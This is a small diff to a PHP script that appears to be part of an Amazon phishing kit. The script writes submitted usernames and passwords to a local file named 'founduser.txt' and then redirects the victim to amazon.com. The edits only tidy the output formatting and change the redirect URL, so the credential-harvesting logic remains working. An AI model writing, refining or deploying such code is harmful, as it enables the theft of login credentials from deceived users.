@@ -7,8 +7,9 @@
  $fileuser = fopen("founduser.txt", "a") or die("Intentalo nuevamente");
  $us = "Username: $user\n";
  $pa = "Password: $pass\n";
- fwrite($fileuser, "\n". $co. "\n". $us. $pa. "\n". $cl); 
+ fwrite($fileuser, "\n". $co. $us. $pa. $cl);
  fclose($fileuser);
- header('Location: https://amazon.com');
+ header('Location: https://www.amazon.com');
  exit()
 ?>
+
